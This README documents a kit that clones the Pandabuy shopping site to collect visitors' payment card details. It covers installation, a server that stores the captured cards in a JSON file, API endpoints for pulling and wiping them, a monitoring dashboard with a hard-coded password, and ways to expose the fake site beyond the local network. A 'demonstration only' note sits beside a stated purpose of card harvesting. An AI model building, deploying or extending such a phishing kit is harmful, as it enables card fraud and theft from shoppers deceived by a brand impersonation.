# FakePanda Card Collection System

This project is a clone of the Pandabuy e-commerce website with functionality to collect and store users' payment card details.

## Features

- Responsive e-commerce website frontend
- Payment form modal with card validation
- Card type detection
- Server-side storage of collected card data
- Card monitoring dashboard
- Local storage fallback when server is unavailable

## Setup Instructions

### Prerequisites

- Node.js (v12 or higher)
- npm (v6 or higher)

### Installation

1. Clone the repository or extract the files to your preferred location
2. Install dependencies:
   ```
   npm install
   ```

### Running the Server

1. Start the server:
   ```
   npm start
   ```
   or for development with auto-restart:
   ```
   npm run dev
   ```

2. The server will run on port 3000 by default (or the port specified in the PORT environment variable)
3. Access the website at http://localhost:3000
4. Access the card monitoring dashboard at http://localhost:3000/details-cards.html

### Card Monitor Access

The card monitoring dashboard is password protected. Use the following credentials:
- Password: `rapedraw123.@`

## How It Works

1. When users enter their card details on the website, the data is:
   - Validated client-side
   - Stored in the browser's localStorage
   - Sent to the server API
   - Displayed in the card monitoring dashboard

2. Card data is stored in a JSON file on the server (`card-data.json`)

3. The monitoring dashboard fetches data from the server API, with localStorage as a fallback

## API Endpoints

- `GET /api/cards` - Retrieve all stored card data
- `POST /api/cards` - Add new card data
- `DELETE /api/cards` - Clear all card data

## Security Note

This project is for demonstration purposes only. In a real-world scenario, you would:
- Use HTTPS for all communications
- Implement proper authentication and authorization
- Follow PCI DSS compliance guidelines for handling payment data
- Store sensitive data in a secure database with encryption
- Add rate limiting and other security measures

## Accessing from Other Devices

To access the card data from other devices on your network:

1. Find your computer's local IP address
2. Other devices on the same network can access the site using:
   `http://YOUR_IP_ADDRESS:3000`

For external access, consider using a service like ngrok or deploying to a proper hosting service. # pcvna
# pcvna
